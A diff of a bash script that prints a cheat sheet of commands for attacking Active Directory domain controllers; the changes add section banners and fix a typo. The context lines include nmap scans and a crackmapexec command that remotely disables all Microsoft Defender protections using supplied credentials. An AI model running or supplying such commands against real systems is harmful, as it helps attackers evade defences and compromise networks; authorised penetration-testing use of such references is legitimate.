@@ -132,14 +132,18 @@ echo -e ""
 ################################################################################
 # Main                                                                     #
 ################################################################################
-echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "	 								${LGREEN}♠ External Commands ♠${RESTORE}"	
+echo -e "     	 				${LIGHTGRAY}This section is used for running scripts and commands externally against a Domain Controller${RESTORE}"															
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 echo -e ""
 
 # Port Scan
 echo -e "${LGREEN}Port Scan${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Nmap${RESTORE}"
-4cho -e ""
+echo -e ""
 echo -e "${IBLUE}# Quick Scans${RESTORE}"
 echo -n -e "nmap -Pn -sV --top-ports 50 --open $IP" ;echo -e " ${YELLOW}# Top 50 ports scan${RESTORE}"
 echo -n -e "nmap -Pn -sV --top-ports 100 --open $IP" ;echo -e " ${YELLOW}# Top 100 ports scan${RESTORE}"
@@ -448,9 +452,14 @@ echo -e "${IBLUE}# Turn off all Defender modules${RESTORE}"
 echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-MpPreference -DisableRealtimeMonitoring \$true;Set-MpPreference -DisableIOAVProtection \$true;Set-MPPreference -DisableBehaviorMonitoring \$true;Set-MPPreference -DisableBlockAtFirstSeen \$true;Set-MPPreference -DisableEmailScanning \$true;Set-MPPReference -DisableScriptScanning \$true;Set-MpPreference -DisableIOAVProtection \$true'"
 echo -e ""
 echo -e ""
-echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
-echo -e ""
-
+################################################################################
+# Internal Access	                                                       #
+################################################################################
+echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
+echo -e "     	 									${LGREEN}♠ Internal Commands ♠${RESTORE}"
+echo -e "     	 					${LIGHTGRAY}This section is used for running scripts and commands internally on a Domain Controller${RESTORE}"									
+echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
 ################################################################################
 # End	                                                                       #
 ################################################################################
